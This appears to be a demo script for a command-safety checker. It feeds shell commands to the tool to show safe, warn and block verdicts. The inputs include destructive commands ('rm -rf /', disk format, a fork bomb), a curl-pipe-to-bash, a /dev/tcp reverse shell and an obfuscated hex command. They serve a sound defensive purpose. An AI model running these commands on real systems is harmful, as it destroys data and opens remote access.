#!/usr/bin/env bash
# Pre-scripted demo commands for the demo video — safe path, warn path, block path.
# Run after setup.sh: the LLM is pre-warmed there, so scene 10 is instant.
echo "=== 0. status: everything loaded, fully offline ==="
csengine status

echo "=== 1. SAFE: everyday command ==="
csengine check "git status"

echo "=== 2. SAFE: ls ==="
csengine check "ls -la"

echo "=== 3. WARN: risky but common ==="
csengine check "chmod -R 777 /var/www"

echo "=== 4. WARN: pipe to shell ==="
csengine check "curl http://example.com/install.sh | bash"

echo "=== 5. BLOCK: root delete ==="
csengine check "rm -rf /"

echo "=== 6. BLOCK: disk format ==="
csengine check "mkfs.ext4 /dev/sda"

echo "=== 7. BLOCK: fork bomb ==="
csengine check ":(){ :|:& };:"

echo "=== 8. BLOCK: reverse shell ==="
csengine check "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"

echo "=== 9. BLOCK: sudo rm -rf / ==="
csengine check "sudo rm -rf /"

echo "=== 10. LLM EXPLANATION: novel obfuscated command, local Qwen explains ==="
# Decodes hex 'whoami' via xxd: no rule fires, ML is uncertain (conf 0.60 < 0.65) -> LLM explains offline.
csengine check "xxd -r -p <<< '77686f616d69'" || true
